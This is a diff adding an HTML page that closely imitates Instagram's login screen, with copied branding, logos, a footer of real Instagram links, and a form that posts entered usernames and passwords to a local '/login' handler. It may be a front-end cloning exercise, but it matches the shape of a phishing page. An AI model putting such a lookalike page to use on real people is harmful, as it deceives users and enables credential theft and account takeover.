@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100..900;1,100..900&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
+        integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="login-page.css">
+    <link rel="icon" href="/images/login-page/logo.png">
+</head>
+
+<body>
+    <div id="photo">
+        <img src="/images/login-page/screenshot1.png" class="blink" alt="feed" id="main-img" >
+        <img src="/images/login-page/new.png" alt="feed" id="main-img2" >
+        <img src="/images/login-page/copy.png" alt="template" width="390" height="590" id="template">
+        <img src="/images/login-page/copy2.png" alt="template" width="600" height="610" id="template2">
+        <!-- <img src="/images/login-page/screenshot2.png" alt="Screenshot 2"> -->
+        <img id="img2" src="/images/login-page/image.png" alt="Image">
+    </div>
+
+    <form method="post" action="/login">
+        <div id="content" class="thin-border">
+            <img id="insta" src="/images/login-page/insta.png" alt="insta-img">
+            <input id="input" type="text" class="input" name="username" autocomplete="off" placeholder="Phone number, username, or email" required>
+            <br>
+            <input id="password" type="password" class="input" name="password" placeholder="Password" required>
+            <br>
+            <button type="submit" id="login-btn">Log in</button>
+            
+            <p id="or">OR</p>
+            <div id="both">
+                <i id="facebook-logo" class="fa-brands fa-facebook"></i>
+                <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATmtalEVtfksrlNeku-bAS5y7CW36lvMyFPNDj4ze8O0eT4IO992wo7Jf5tMv0GBUsMacmaVR5-e6BqiIvYnPJnMvxWfZTaq0hzNBL2qkoszgAvtLDtr4SMfqVsvWYYQaFDD_yi-3RMwLz3O5HqUGRkYTXoxi6gqT_v6uECGP_vNvgR9Q3VMddjtbiTdsDRirIMCgIOtGNM4D-Kl-m23xFWetGV6XSSD2FOYueeO49h2omI12TPkmUbSzlEwF1lyeZUH" id="facebook-login">Log in with Facebook</a>
+            </div>
+
+            <a href="https://www.instagram.com/accounts/password/reset/" id="forgot-password">Forgot password?</a>
+
+        </div>
+
+        <div id="content2">
+            <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" id="signup">Sign Up</a></p>
+        </div>
+
+    </form>
+    
+</body>
+
+
+<footer>
+  <div id="footer">
+    <div class="footer-links">
+      <span><a href="https://www.meta.com/en-gb/about/" target="_blank">Meta</a></span>
+      <span><a href="https://about.instagram.com/" target="_blank">About</a></span>
+      <span><a href="https://about.instagram.com/blog" target="_blank">Blog</a></span>
+      <span><a href="https://about.instagram.com/about-us/careers" target="_blank">Jobs</a></span>
+      <span><a href="https://help.instagram.com/">Help</a></span>
+      <span><a href="https://developers.facebook.com/docs/instagram-platform" target="_blank">API</a></span>
+      <span><a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect" target="_blank">Privacy</a></span>
+      <span><a href="https://help.instagram.com/581066165581870/" target="_blank">Terms</a></span>
+      <span><a href="https://www.instagram.com/explore/locations/">Locations</a></span>
+      <span><a href="https://www.instagram.com/web/lite/">Instagram Lite</a></span>
+      <span><a href="https://www.threads.com/" target="_blank">Threads</a></span>
+      <span><a href="https://www.facebook.com/help/instagram/261704639352628" target="_blank">Contact Uploading & Non-Users</a></span>
+      <span><a href="https://www.instagram.com/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fmeta_verified%2F%3Fentrypoint%3Dweb_footer%26__coig_login%3D1">Meta Verified</a></span>
+    </div>
+    <p id="footer-last" class="footer-copy">© 2025 Instagram from Meta</p>
+  </div>
+</footer>
+
+<script src="your-script.js"></script>
+
+</html>
